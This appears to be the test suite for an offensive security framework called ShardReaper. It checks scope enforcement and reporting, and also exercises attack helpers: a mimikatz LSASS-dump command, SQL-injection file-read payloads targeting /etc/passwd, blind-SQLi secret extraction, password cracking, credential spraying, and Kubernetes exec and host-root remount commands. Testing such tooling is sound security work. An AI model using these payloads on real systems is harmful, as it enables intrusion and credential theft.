#!/usr/bin/env python3
"""ShardReaper self-tests — run: python3 -m pytest tests/ -q  (or directly)"""
import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# keep the memory ledger hermetic during tests
os.environ.setdefault("SHARDREAPER_MEMORY_DIR",
                      tempfile.mkdtemp(prefix="shardreaper-mem-test-"))
os.environ.setdefault("SHARDREAPER_SKIP_ENVCHECK", "1")  # no tool probes in tests

from shardreaper.scope import Scope, OutOfScopeError
from shardreaper.state import Engagement
from shardreaper.knowledge import Knowledge, corpus_roots
from shardreaper.weapons import Weapons
from shardreaper.atomics import AtomicIndex, _mini_yaml
from shardreaper.llm import extract_json


# ---------------- scope ----------------
def test_scope_patterns():
    s = Scope(["example.com", "*.sub.example.com", "api.exact.io",
               "10.0.0.0/8", r"re:^lab[0-9]+\.example\.com$", "svc.example.com:8443"],
              out_of_scope=["admin.example.com", "10.0.0.5"])
    assert s.in_scope_host("example.com")
    assert s.in_scope_host("api.example.com")          # apex rule covers subdomains
    assert s.in_scope_host("x.sub.example.com")        # wildcard rule
    assert s.in_scope_host("api.exact.io")
    assert not s.in_scope_host("api.exact.io.evil.net")
    assert s.in_scope_host("10.0.0.7")
    assert s.in_scope_host("10.255.1.1")
    assert not s.in_scope_host("11.0.0.1")
    assert s.in_scope_host("lab42.example.com")        # regex rule
    assert s.in_scope_host("svc.example.com")          # host part of port rule
    # deny wins
    assert not s.in_scope_host("admin.example.com")
    assert not s.in_scope_host("10.0.0.5")
    # port binding: the bound rule restricts ITS OWN match; apex rule still allows
    assert s.in_scope("svc.example.com", port=8443)
    # default deny
    assert not s.in_scope_host("elsewhere.net")
    assert s.reject_reason("elsewhere.net")


def test_scope_wildcard_excludes_apex():
    s = Scope(["*.sub.example.com"])
    assert s.in_scope_host("x.sub.example.com")
    assert not s.in_scope_host("sub.example.com")      # wildcard excludes the apex


def test_scope_regex_alone():
    s = Scope([r"re:^lab[0-9]+\.example\.com$"])
    assert s.in_scope_host("lab42.example.com")
    assert not s.in_scope_host("lab.example.com")
    assert not s.in_scope_host("lab42.example.com.evil.net")


def test_scope_port_binding_alone():
    s = Scope(["svc.example.com:8443", "web.example.com:8000-9000"])
    assert s.in_scope("svc.example.com", port=8443)
    assert not s.in_scope("svc.example.com", port=80)
    assert s.in_scope("web.example.com", port=8500)
    assert not s.in_scope("web.example.com", port=7999)


def test_scope_path_binding():
    s = Scope(["example.com/api"])
    assert s.in_scope("example.com", port=443, path="/api")
    assert s.in_scope("example.com", port=443, path="/api/v1/users")
    assert not s.in_scope("example.com", port=443, path="/admin")
    assert not s.in_scope("example.com", port=443, path="/")     # base path denied
    # path rule is port-blind
    assert s.in_scope("example.com", port=8080, path="/api")


def test_scope_bare_ipv6():
    s = Scope(["2001:db8::1"])
    assert s.in_scope_host("2001:db8::1")
    assert not s.in_scope_host("2001:db8::2")
    s6 = Scope(["2001:db8::/32"])
    assert s6.in_scope_host("2001:db8::42")
    assert not s6.in_scope_host("2001:db9::1")


def test_scope_check_missing_file():
    from shardreaper.scope import check
    rc = check(["example.com"], scope_path="/nonexistent/scope.json")
    assert rc == 1


def test_scope_wildcard_excludes_apex():
    s = Scope(["*.sub.example.com"])
    assert s.in_scope_host("x.sub.example.com")
    assert not s.in_scope_host("sub.example.com")      # wildcard excludes the apex


def test_scope_enforce_raises():
    s = Scope(["10.0.0.0/24"], name="lab")
    s.enforce("10.0.0.9")
    try:
        s.enforce("192.168.1.1")
        raise AssertionError("should have raised")
    except OutOfScopeError:
        pass


# ---------------- state ----------------
def test_engagement_roundtrip():
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.log("hello")
        f = eng.add_finding("x", "high", "info-leak", "T1005", "host", ["ev"], "detail")
        assert f["id"] == "F001"
        eng2 = Engagement.load(d)
        assert eng2.state["findings"][0]["id"] == "F001"
        assert len(eng2.state["actions"]) == 0
        eng2.add_target("h1", url="http://h1")
        eng3 = Engagement.load(d)
        assert eng3.state["targets"][0]["host"] == "h1"


# ---------------- knowledge ----------------
def test_knowledge_corpus_mounted():
    roots = corpus_roots()
    assert "hacktricks" in roots, "hacktricks corpus must be beside the project"
    k = Knowledge(roots)
    hits = k.search("golden ticket kerberos", limit=5)
    assert hits, "expected hits for kerberos golden ticket"
    assert any(h["corpus"] in ("hacktricks", "ired", "bughunter") for h in hits)


def test_knowledge_paths_are_real():
    k = Knowledge()
    hits = k.search("unquoted service path", limit=3)
    for h in hits:
        assert os.path.isfile(h["path"]), f"bad path {h['path']}"


# ---------------- weapons ----------------
def test_weapons_builtin():
    w = Weapons({})
    r = w.search("port scan")
    assert r and any("RustScan" == e["name"] or "nmap" == e["name"] for e in r)
    assert w.by_phase("recon")


def test_weapons_corpus_parse():
    roots = corpus_roots()
    w = Weapons(roots if roots else None, refresh=True)
    entries = w._load()
    assert len(entries) >= len(__import__("shardreaper.weapons", fromlist=["BUILTIN"]).BUILTIN)
    # corpus parse should add toolkit tables when present
    if "toolkit" in roots:
        names = {e["name"] for e in entries}
        assert "RustScan" in names


# ---------------- atomics ----------------
SAMPLE = """attack_technique: T1003
display_name: 'OS Credential Dumping'
atomic_tests:
- name: Dump LSASS
  auto_generated_guid: 1111
  description: |
    Dumps lsass memory
  supported_platforms:
  - windows
  executor:
    command: |
      mimikatz "#{exe_path}" sekurlsa::logonpasswords
    name: command_prompt
  input_arguments:
    exe_path:
      description: path
      type: path
      default: C:\\Tools\\mimikatz.exe
"""


def test_mini_yaml():
    d = _mini_yaml(SAMPLE)
    assert d["attack_technique"] == "T1003"
    assert d["display_name"] == "OS Credential Dumping"
    assert len(d["atomic_tests"]) == 1
    t = d["atomic_tests"][0]
    assert t["name"] == "Dump LSASS"
    assert "mimikatz" in t["executor"]["command"]
    assert t["input_arguments"]["exe_path"]["default"] == "C:\\Tools\\mimikatz.exe"


def test_mini_yaml_platforms():
    src = """attack_technique: T1010
display_name: 'Application Window Discovery'
atomic_tests:
- name: Test one
  description: x
  supported_platforms:
  - windows
  - macos
  executor:
    command: |
      whoami
    name: sh
  dependencies:
  - description: prereq
    prereq_command: exit 0
"""
    d = _mini_yaml(src)
    assert d["atomic_tests"][0]["supported_platforms"] == ["windows", "macos"]


def test_atomic_index_real():
    roots = corpus_roots()
    if "atomic" not in roots:
        return
    idx = AtomicIndex(roots["atomic"])
    n_tech, n_tests = idx.count()
    assert n_tech > 300
    assert n_tests > 1500
    tech = idx.get("T1003")
    assert tech and tech["display_name"]
    sel = idx.select(["credential", "dump"], platform="windows", limit=5)
    assert sel
    r = idx.run_test(tech["tests"][0], dry_run=True)
    assert r["dry_run"] and r["cmd"]


def test_atomic_strict_select():
    roots = corpus_roots()
    if "atomic" not in roots:
        return
    idx = AtomicIndex(roots["atomic"])
    loose = idx.select(["web"], platform=None, limit=10, strict=False)
    strict = idx.select(["web"], platform=None, limit=10, strict=True)
    assert strict
    # every strict hit must match the keyword in the test NAME or technique name
    for s in strict:
        hay = (s["name"] + " " + s["technique_name"]).lower()
        assert "web" in hay
    # strict mode may be smaller but never empty
    assert all(s["score"] >= 2 for s in strict)


def test_tactical_weapon_mapping():
    from shardreaper.engine import TACTICAL_WEAPON_PHASES
    from shardreaper.weapons import Weapons
    w = Weapons(corpus_roots(), refresh=False)
    assert TACTICAL_WEAPON_PHASES["escalate"] == "privilege-escalation"
    assert TACTICAL_WEAPON_PHASES["exfil"] == ["exfiltration", "c2"]
    for key, wps in TACTICAL_WEAPON_PHASES.items():
        wps = wps if isinstance(wps, list) else [wps]
        got = []
        for wp in wps:
            got += w.by_phase(wp, limit=8)
        assert got, f"tactical phase {key} must resolve to weapons"


def test_phase_validation():
    from shardreaper.engine import cli_run
    import tempfile, os
    from types import SimpleNamespace
    with tempfile.TemporaryDirectory() as d:
        base = os.path.join(d, "eng")
        engage_local(base)
        ok = cli_run(SimpleNamespace(dir=base, phases="recon,bogus", go=False,
                                     mock=True, wordlist=None, top_ports=100,
                                     no_paths=False))
        assert ok == 2


def engage_local(base):
    from shardreaper.engine import engage
    engage(base, "t", ["http://localhost:8000"], ["localhost"], [], "obj", mock=True)


def test_engage_seed_scope_warning(tmp_path=None):
    import io, contextlib
    from shardreaper.engine import engage
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            engage(os.path.join(d, "eng"), "warn-demo", ["http://evil.net"],
                   ["localhost"], [], "")
        out = buf.getvalue()
        assert "OUT of scope" in out


# ---------------- llm ----------------
def test_extract_json():
    assert extract_json('x ```json\n{"a": 1}\n``` y') == {"a": 1}
    assert extract_json('{"b": 2}') == {"b": 2}
    assert extract_json("no json") is None


# ---------------- engine mock pipeline ----------------
def test_engine_mock_pipeline():
    from shardreaper.engine import engage, Engine
    with tempfile.TemporaryDirectory() as d:
        base = os.path.join(d, "eng")
        engage(base, "mock-lab", ["http://localhost:8000"], ["localhost"],
               ["admin.localhost"], "prove local lab access", mock=True)
        eng = Engine(base, phases=["recon", "analyze", "plan", "attack", "report"], mock=True)
        eng.run()
        assert eng.eng.state["targets"]
        assert eng.eng.state["plan"]
        report = os.path.join(base, "REPORT.md")
        assert os.path.isfile(report)
        assert "ShardReaper Engagement Report" in open(report).read()


def test_engine_tactical_phases():
    from shardreaper.engine import engage, Engine
    with tempfile.TemporaryDirectory() as d:
        base = os.path.join(d, "eng")
        engage(base, "tactical-lab", ["http://localhost:8000"], ["localhost"],
               [], "obj", mock=True)
        eng = Engine(base, phases=["escalate", "persist", "move", "harvest",
                                   "evade", "exfil", "report"], mock=True)
        eng.run()
        notes = eng.eng.state["notes"]
        tactical = [n for n in notes if str(n.get("kind", "")).startswith("tactical-")]
        assert len(tactical) == 6
        for n in tactical:
            assert n.get("weapons"), f"{n['kind']} must record weapons"
        assert os.path.isfile(os.path.join(base, "REPORT.md"))


def test_report_renders_findings():
    from shardreaper.report import render_report
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.add_finding("Exposed .env with secrets", "high", "info-leak",
                        "T1552", "target.local", ["GET /.env -> 200"],
                        "AWS keys visible", "credential theft", "remove file")
        eng.add_finding("Missing security headers", "low", "hardening",
                        "T1595", "target.local", [], "no CSP/HSTS")
        eng.log_action("T1552", "target.local", "GET /.env", outcome="executed")
        md = render_report(eng)
        assert "F001" in md and "HIGH" in md and "F002" in md and "LOW" in md
        assert "attack.mitre.org" in md




# ---------------- memory / resume ----------------
def test_memory_roundtrip():
    from shardreaper import memory
    memory.log_finding("eng-a", "tgt.local", {"id": "F001", "severity": "high",
                                              "class": "idor", "title": "T1",
                                              "technique": "T1005"})
    memory.log_negative("tgt.local", "T1059", "no exec")
    memory.log_note("tgt.local", "WAF resets sessions")
    memory.touch_session("tgt.local", "eng-a")
    text = memory.pickup("tgt.local")
    assert "T1" in text and "high" in text
    assert "T1059" in text and "WAF resets sessions" in text
    assert "eng-a" in text
    # finding capture fires automatically from state
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "eng-b")
        eng.add_finding("auto captured", "medium", "xss", "T1059.007",
                        "tgt2.local", ["ev"], "d")
        assert "auto captured" in memory.pickup("tgt2.local")


def test_memory_gc():
    from shardreaper import memory
    assert "findings.jsonl" in memory.gc(rotate=True)


# ---------------- web3 token-scan ----------------
EVM_FIXTURE = """
contract RugToken {
    address owner;
    function mint(address to, uint256 amount) public { }   // hidden mint
    function setFee(uint256 f) external { fee = f; }       // uncapped fee
    function renounceOwnership() public onlyOwner { }      // fake renounce
    function rug() external { selfdestruct(payable(owner)); }
}
"""
SOLANA_FIXTURE = """
pub fn set_mint_authority(ctx: Context<SetMintAuthority>) -> Result<()> {
    msg!("authority not renounced");
    Ok(())
}
"""


def test_token_scan_evm():
    from shardreaper.tokens import scan_file
    import tempfile as tf
    with tf.TemporaryDirectory() as d:
        p = os.path.join(d, "RugToken.sol")
        open(p, "w").write(EVM_FIXTURE)
        hits = scan_file(p)
    ids = {h["id"] for h in hits}
    assert "hidden-mint" in ids and "fee-manipulation" in ids
    assert "fake-renounce" in ids and "selfdestruct" in ids
    assert all(h["severity"] for h in hits)


def test_token_scan_solana():
    from shardreaper.tokens import scan_file
    import tempfile as tf
    with tf.TemporaryDirectory() as d:
        p = os.path.join(d, "lib.rs")
        open(p, "w").write(SOLANA_FIXTURE)
        hits = scan_file(p, chain="solana")
    assert any(h["id"] == "mint-authority-not-renounced" for h in hits)


# ---------------- platform reports ----------------
def test_report_platforms():
    from shardreaper.report import render_h1, render_bugcrowd, render_intigriti
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.add_finding("IDOR on orders", "critical", "idor", "T1005",
                        "api.tgt", ["1. GET /api/orders/1", "2. change id -> 200"],
                        "read any user's orders")
        h1 = render_h1(eng)
        assert "Weakness" in h1 and "Steps to Reproduce" in h1 and "Impact" in h1
        bc = render_bugcrowd(eng)
        assert "VRT" in bc and "broken_access_control" in bc
        it = render_intigriti(eng)
        assert "Business impact" in it


def test_report_skips_gated_killed():
    from shardreaper.report import render_h1
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.add_finding("killed finding", "low", "xss", "T1059.007",
                        "t", [], "d")
        eng.state["findings"][0]["gate"] = {"passed": False, "decision": "kill"}
        assert "killed finding" not in render_h1(eng)


# ---------------- triage / chain / surface / intel / map ----------------
def test_triage_gate():
    from shardreaper.analysis import run_gate
    ok = run_gate({f"q{i}": True for i in range(1, 8)} | {"q6": False})
    assert ok["passed"] and ok["decision"] == "submit"
    dup = run_gate({f"q{i}": True for i in range(1, 8)} | {"q6": True})
    assert not dup["passed"] and dup["decision"] == "kill"


def test_triage_command_noninteractive():
    from shardreaper.analysis import triage
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.add_finding("x", "high", "idor", "T1005", "t", ["e"], "d")
        out = triage(eng, interactive=False, assume_yes=True)
        assert out and out[0][1]["passed"]
        assert eng.state["findings"][0]["gate"]["decision"] == "submit"


def test_chain_resolve():
    from shardreaper.analysis import chain
    from shardreaper.knowledge import Knowledge
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.add_finding("IDOR on orders", "critical", "idor", "T1005",
                        "api.tgt", ["ev"], "d")
        out = chain(eng, Knowledge(), finding_id="F001")
    assert "F001" in out
    assert "ato" in out or "mass-data" in out


def test_surface_ranking():
    from shardreaper.analysis import surface
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.state["targets"] = [{"host": "h1", "ports": {22: None, 8080: None},
                                 "urls": [{"url": "http://h1:8080", "status": 200,
                                           "tech": []}],
                                 "intel": {}, "findings": [
                                     {"severity": "high", "type": "exposed-path",
                                      "path": "/.env", "detail": "leak"}]}]
        eng.state["findings"] = [{"id": "F001", "title": "dead", "severity": "low",
                                  "gate": {"passed": False}}]
        out = surface(eng)
    assert "P1" in out and "P2" in out and "KILL LIST" in out


def test_map_class():
    from shardreaper.analysis import map_class
    from shardreaper.knowledge import Knowledge
    from shardreaper.weapons import Weapons
    from shardreaper.atomics import AtomicIndex
    kb = Knowledge()
    roots = kb.roots
    atomics = AtomicIndex(roots["atomic"]) if "atomic" in roots else None
    weapons = Weapons(roots)
    out = map_class(kb, atomics, weapons, "kerberos golden ticket")
    assert "playbooks" in out and "weapons" in out


# ---------------- autopilot ----------------
def test_autopilot_cli():
    from shardreaper.engine import engage, cli_autopilot
    from types import SimpleNamespace
    with tempfile.TemporaryDirectory() as d:
        base = os.path.join(d, "eng")
        engage(base, "ap", ["http://localhost:8000"], ["localhost"], [], "obj")
        rc = cli_autopilot(SimpleNamespace(dir=base, phases="", mode="yolo",
                                           go=False, mock=True, yes=True))
        assert rc == 0
        eng = Engagement.load(base)
        assert eng.phase == "report"
        assert os.path.isfile(os.path.join(base, "REPORT.md"))




def test_osint_expansion_patched():
    """OSINT expansion with crt.sh patched (no network): scope-filtered + liveness."""
    from shardreaper import osint as osintmod
    from shardreaper.scope import Scope
    osintmod.shutil.which = lambda name: None   # no external tools in tests
    osintmod.crtsh = lambda apex, timeout=25: {
        "api.example.com", "dev.example.com", "admin.example.com",
        "evil.net.example.com", "*.www.example.com",
    }
    scope = Scope(["example.com"], ["admin.example.com"], name="osint-test")
    # liveness: only api + dev resolve
    live = osintmod.osint_expand(
        scope, ["example.com"],
        resolve=lambda h: h in ("api.example.com", "dev.example.com"),
        log=lambda *a, **k: None)
    assert "api.example.com" in live
    assert "dev.example.com" in live
    assert "admin.example.com" not in live   # out-of-scope rule wins
    assert "evil.net.example.com" not in live  # no DNS



# ---------------- ultimate pass: awesome catalog, scope.md, navigator, validate, classify, redact, hunt ----------------
def test_awesome_weapons_parse():
    from shardreaper.weapons import _parse_awesome
    roots = corpus_roots()
    if "awesome" not in roots:
        return
    entries = _parse_awesome(roots["awesome"])
    assert len(entries) > 250
    assert any(e["phase"] == "initial-access" for e in entries)
    assert any("uac" in e["name"].lower() for e in entries)


def test_weapons_install_blocks():
    from shardreaper.weapons import _parse_rtt
    roots = corpus_roots()
    if "redteam-tools" not in roots:
        return
    entries = _parse_rtt(roots["redteam-tools"])
    with_install = [e for e in entries if e.get("install")]
    assert with_install, "install blocks should be captured"


def test_scope_md_load():
    from shardreaper.scope import Scope
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "scope.md")
        open(p, "w").write(
            "# Scope — demo\n## In scope\n* example.com\n* 10.0.0.0/8\n"
            "## Out of scope\n* admin.example.com\n## Seeds\n* http://api.example.com\n")
        s = Scope.load_md(p)
    assert s.in_scope_host("api.example.com")
    assert not s.in_scope_host("admin.example.com")
    assert s.in_scope_host("10.1.2.3")
    assert s.seeds == ["http://api.example.com"]


def test_navigator_layer():
    from shardreaper.atomics import build_navigator_layer
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.log_action("T1003.001", "h1", "lsass dump", outcome="executed")
        eng.state["plan"] = [{"technique": "T1595.003 Wordlist Scanning"}]
        layer = build_navigator_layer(eng)
    tids = [t["techniqueID"] for t in layer["techniques"]]
    assert "T1003.001" in tids and "T1595.003" in tids
    assert layer["domain"] == "enterprise-attack"


def test_validate_command():
    from shardreaper.analysis import validate, ALWAYS_REJECTED
    with tempfile.TemporaryDirectory() as d:
        eng = Engagement(d, "t1")
        eng.add_finding("self-XSS on profile", "low", "self-xss", "T1059.007",
                        "t", [], "d")
        results = validate(eng, assume_yes=True)
        assert results[0][1]["decision"] == "kill"     # always-rejected class
        eng.add_finding("IDOR real", "high", "idor", "T1005", "t", ["ev"], "d")
        results = validate(eng, finding_ids=["F002"], assume_yes=True)
        assert results[0][1]["passed"]


def test_classify():
    from shardreaper.analysis import classify
    from shardreaper.knowledge import Knowledge
    out = classify("https://api.example.com/graphql", Knowledge())
    assert "graphql" in out
    out2 = classify("https://x/vpn/portal", Knowledge())
    assert "vpn" in out2


def test_report_redact():
    from shardreaper.report import redact
    md = "session=abc123 cookie=secret email=op@corp.com Bearer eyJhbGciOiJIUzI1NiJ9.x.y"
    out = redact(md)
    assert "op@corp.com" not in out and "[EMAIL]" in out
    assert "abc123" not in out and "Bearer [REDACTED]" in out
    assert "eyJhbGciOiJIUzI1NiJ9" not in out


def test_hunt_scaffold():
    from shardreaper.engine import cli_hunt
    from types import SimpleNamespace
    with tempfile.TemporaryDirectory() as d:
        base = os.path.join(d, "hunt")
        rc = cli_hunt(SimpleNamespace(dir=base, name="t", seeds=["http://a.example"],
                                      in_scope=["example.com"], out_of_scope=[],
                                      objective="o", mode="red-team"))
        assert rc == 0
        assert os.path.isfile(os.path.join(base, "scope.md"))
        assert os.path.isdir(os.path.join(base, "findings"))
        assert os.path.isdir(os.path.join(base, "evidence"))
        assert os.path.isfile(os.path.join(base, "state.json"))



# ---------------- post-Cobblestone hardening ----------------
def _fake_oracle_probe(secret="hunter2"):
    import re as _re
    def probe(cond):
        m = _re.match(r"ASCII\(SUBSTRING\(\(SECRET\),(\d+),1\)\)>(\d+)", cond)
        if m:
            return ord(secret[int(m.group(1)) - 1]) > int(m.group(2))
        m = _re.match(r"LENGTH\(\(SECRET\)\)<=(\d+)", cond)
        if m:
            return len(secret) <= int(m.group(1))
        return cond == "1=1"
    return probe


def test_sqli_variants():
    from shardreaper.sqli import variants
    vs = variants("-1")
    assert "-1" in vs and -1 in vs
    vs2 = variants(0)
    assert 0 in vs2 and "0" in vs2


def test_sqli_oracle_validate_and_extract():
    from shardreaper.sqli import Oracle
    oracle = Oracle(_fake_oracle_probe())
    v = oracle.validate()
    assert v["ok"] and v["true_cond_evaluates"] and not v["false_cond_evaluates"]
    assert oracle.extract_string("SECRET") == "hunter2"
    # a broken oracle must be detected, not silently trusted
    broken = Oracle(lambda cond: True)
    assert not broken.validate()["ok"]


def test_sqli_file_read_encoded():
    from shardreaper.sqli import file_read_payload, decode_exfil
    p = file_read_payload("mysql", "/etc/passwd")
    assert "TO_BASE64" in p and "LOAD_FILE" in p
    p2 = file_read_payload("mysql", "/etc/passwd", encoding="hex")
    assert "HEX(LOAD_FILE" in p2
    assert "pg_read_file" in file_read_payload("postgres", "/etc/passwd")
    # decode roundtrip
    import base64
    blob = base64.b64encode(b"root:x:0:0:root:/root:/bin/bash").decode()
    raw, how = decode_exfil("<div>" + blob + "</div>")
    assert raw.startswith(b"root:x:") and how == "base64"


def test_fuzz():
    from shardreaper.fuzz import harvest_refs, fuzz_paths
    refs = harvest_refs('<script src="/static/app.js"></script>'
                        '<?php include "skins.php"; ?>'
                        '<a href="admin.php">x</a>')
    assert "static/app.js" in refs or "skins.php" in refs or "admin.php" in refs
    found = fuzz_paths(lambda c: "content" if c.endswith("skins.php") else None,
                       ["index.php", "skins.php", "admin.php"], "/var/www/html")
    assert len(found) == 1 and found[0]["path"].endswith("skins.php")


def test_crack_ground_truth():
    from shardreaper.crack import verify, identify
    vectors = [
        ("secret", "$1$deadbeef$ybdbWGoRB3GJ6nEVnhq7O0"),
        ("secret", "$5$saltsalt$0IyaXrmV7.sGNS6tirgqHLqX/G.FBvgkYA.lpPdS5sA"),
        ("secret", "$6$saltsalt$TVLlQcbpFVof5W3Yz4DTP6gRstiNuHwwTt6GLc1E5n0U0aDehy0S5knV8wiOQSpT0Y77vwPZN.Pq.H91p5hVO1"),
        ("password123", "$5$rounds=1000$someval$5eCN1JFu72ZTrJI42vMI46knJHTfjz8CyI0eJtn5Ir/"),
    ]
    for pw, h in vectors:
        assert verify(pw, h), f"failed {h[:12]}"
        assert not verify("wrong", h)
    assert identify(vectors[0][1]) == "md5crypt"
    assert identify(vectors[1][1]) == "sha256crypt"
    assert identify(vectors[2][1]) == "sha512crypt"


def test_crack_wordlist():
    from shardreaper.crack import crack
    with tempfile.TemporaryDirectory() as d:
        wl = os.path.join(d, "wl.txt")
        open(wl, "w").write("password\npassword123\nadmin\n")
        pw, rule = crack("$5$rounds=1000$someval$5eCN1JFu72ZTrJI42vMI46knJHTfjz8CyI0eJtn5Ir/",
                         wl, rules=("", "c"))
        assert pw == "password123"
        pw2, _ = crack("$1$deadbeef$ybdbWGoRB3GJ6nEVnhq7O0", wl)
        assert pw2 is None


def test_envcheck():
    from shardreaper.envcheck import probe_tool, writable_dirs, format_report, arsenal_report
    r = probe_tool("definitely-not-a-real-tool-xyz", ["--version"])
    assert r["status"] == "missing"
    assert arsenal_report()["fallbacks"]["pure-crack"].startswith("ok")
    assert "writable" in writable_dirs([("tmp", tempfile.mkdtemp())])["tmp"]
    assert "hashcat" in format_report(arsenal_report())


def test_canary_url():
    from shardreaper.canary import canary_url
    u = canary_url("10.0.0.5", 8888, "tok123")
    assert u == "http://10.0.0.5:8888/tok123"


def test_transport_healthcheck():
    from shardreaper.transport import healthcheck, format_health
    r = healthcheck()
    for key in ("vpn_processes", "tun_present", "gateway", "dns"):
        assert key in r
    assert "TRANSPORT SELF-CHECK" in format_health(r)


def test_adaptive_policy():
    from shardreaper.recon import adaptive_policy
    assert adaptive_policy(50, 100, 0)["ban"] is False
    p = adaptive_policy(30, 100, 1)
    assert p["pause"] > 0 and p["timeout"] > 3.0
    assert adaptive_policy(2, 100, 2)["ban"] is True
    # small scans never ban
    assert adaptive_policy(0, 10, 3)["ban"] is False


def test_memory_checkpoint():
    from shardreaper import memory
    memory.checkpoint("eng-ckpt", "attack",
                      [{"id": "F001", "severity": "high", "title": "x"}],
                      ["T1059"], ["deep-web-audit"])
    roll = memory._rollup("_engagement_eng-ckpt")
    assert roll["checkpoints"][-1]["phase"] == "attack"


# ---------------- v1.2 fixes: k8s / spray / payload / rack / report ----------------
def test_k8s_exec_url():
    from shardreaper.k8s import build_exec_url, EXEC_PROTOCOLS
    u = build_exec_url("default", "pod-a", "c1", ["/bin/sh", "-c", "id"])
    assert "/exec/default/pod-a/c1?" in u
    assert u.count("command=") == 3          # command is repeatable
    assert "output=1" in u and "input=1" in u and "error=1" in u
    assert EXEC_PROTOCOLS == ["v4.channel.k8s.io", "v5.channel.k8s.io"]  # v4 first


def test_k8s_ws_codec():
    from shardreaper.k8s import encode_frame, decode_frame, CH_STDOUT
    f = encode_frame(bytes([CH_STDOUT]) + b"hello", opcode=0x2,
                     mask_key=b"\x01\x02\x03\x04")
    frame, consumed = decode_frame(f, 0)
    assert consumed == len(f)
    assert frame["opcode"] == 0x2
    assert frame["payload"] == bytes([CH_STDOUT]) + b"hello"
    # server-style unmasked frame decodes too
    server = bytes([0x82, 0x03]) + b"abc"
    fr, _ = decode_frame(server, 0)
    assert fr["payload"] == b"abc"
    assert fr["opcode"] == 0x2 and fr["fin"] == 1


def test_k8s_pod_mounts():
    from shardreaper.k8s import pod_mounts
    pods = {"items": [{"metadata": {"name": "p1", "namespace": "kube-system"},
                       "spec": {
                           "volumes": [{"name": "hostroot",
                                        "hostPath": {"path": "/"}}],
                           "containers": [{"name": "c1", "volumeMounts": [
                               {"name": "hostroot",
                                "mountPath": "/host/root"}]}]}}]}
    m = pod_mounts(pods)
    assert m and m[0]["host_path"] == "/"
    assert m[0]["mount_path"] == "/host/root"
    assert m[0]["pod"] == "p1"


def test_spray_classify_differential():
    from shardreaper.spray import classify_response
    c, lbl = classify_response(400, "websocket: the client is not using the "
                                "websocket protocol", "kubelet")
    assert c == "400-bad-request" and "not a denial" in lbl
    c, lbl = classify_response(403, "websocket: unsupported channel subprotocol",
                               "kubelet")
    assert c == "403-protocol-mismatch"
    c, lbl = classify_response(403, '{"message":"pods is forbidden: User '
                               '\\"system:anonymous\\" cannot list resource"}',
                               "kubelet")
    assert c == "403-rbac-denial"
    assert classify_response(401, "Unauthorized", "apiserver")[0] \
        == "401-unauthenticated"
    assert classify_response(404, "", "kubelet")[0] == "404-not-found"
    assert classify_response(500, "internal error", "kubelet")[0] \
        == "500-server-error"
    # 400/403/500 must NEVER collapse into one verdict
    classes = {classify_response(s, b, "")[0]
               for s, b in ((400, "websocket"), (403, "websocket"),
                            (403, "forbidden"), (500, "err"))}
    assert len(classes) == 4
    # a 403-with-subprotocol-mismatch is NOT an RBAC denial
    assert classify_response(403, "websocket upgrade", "")[0] \
        != classify_response(403, "forbidden", "")[0]


def test_spray_request_forms():
    from shardreaper.spray import request_forms
    f = request_forms({"type": "sa-token", "value": "tok"}, "kubelet")
    assert any("Bearer tok" in (h.get("Authorization") or "") for h, _ in f)
    f = request_forms({"type": "password", "value": "pw", "user": "root"},
                      "registry")
    assert any("Basic" in (h.get("Authorization") or "") for h, _ in f)
    f = request_forms({"type": "jwt", "value": "a.b.c"}, "http")
    names = [n for _, n in f]
    assert "bearer" in names and "x-api-key" in names


def test_spray_401_retry_with_every_cred():
    from shardreaper.spray import spray
    d = tempfile.mkdtemp()
    eng = Engagement(d, "spraytest", os.path.join(d, "scope.json"))
    eng.state["seeds"] = ["10.0.0.9"]
    calls = []

    def fake_probe(surface, headers=None, timeout=6):
        calls.append((surface["name"], headers))
        if headers and "Bearer tokBxxxxxxyy" in (headers.get("Authorization") or ""):
            return 200, "ok", "tcp"
        return 401, "Unauthorized", "tcp"

    creds = [{"type": "sa-token", "value": "tokAxxxxxxaa"},
             {"type": "sa-token", "value": "tokBxxxxxxyy"}]
    r = spray(eng, creds, log=lambda m: None, ssh=False, probe=fake_probe,
              timeout=1)
    assert r["hits"], "401 must trigger an automatic retry with every held credential"
    assert "tokBxx" in r["hits"][0]["credential"]  # mask keeps first 6 chars
    assert any(h is None for _, h in calls)  # unauthenticated baseline first


def test_payload_literal_and_markers():
    from shardreaper.payload import (literal, assert_literal, marker_wrap,
                                     marker_value, verify_after, remount_rw,
                                     PayloadViolation)
    cmd = literal("echo", "a b", "$(id)")
    assert "'a b'" in cmd and "'$(id)'" in cmd  # quoted on OUR side
    for bad in ("echo $HOME", "x=$(id)", "cat ${F}", "echo `id`",
                "echo $((1+1))"):
        try:
            assert_literal(bad)
            raise AssertionError(f"should reject: {bad}")
        except PayloadViolation:
            pass
    w = marker_wrap("echo hi", marker="T", label="s")
    assert "__T_s_BEGIN__" in w and "rc=$?" in w
    assert marker_value("junk __T_s_BEGIN__hello__T_s_END__ rc=0", "T", "s") \
        == "hello"
    v = verify_after("mount -o remount,rw /host/root", "grep x", expect="rw")
    assert v["expect"] == "rw"
    r = remount_rw("/host/root")   # remount prints NOTHING on success
    assert "remount,rw" in r["cmd"] and "/proc/mounts" in r["verify"]


def test_payload_nspid_and_nscheck():
    from shardreaper.payload import parse_nspid, ns_check, HOST_USERNS_INODE
    assert parse_nspid("Name:\tsh\nNSpid:\t1234\t7\n") == [1234, 7]  # nested ns
    assert parse_nspid("NSpid:\t1234\n") == [1234]
    r = ns_check()   # linux smoke — never raises
    assert "nspid" in r and "pod_side_effects_trustworthy" in r
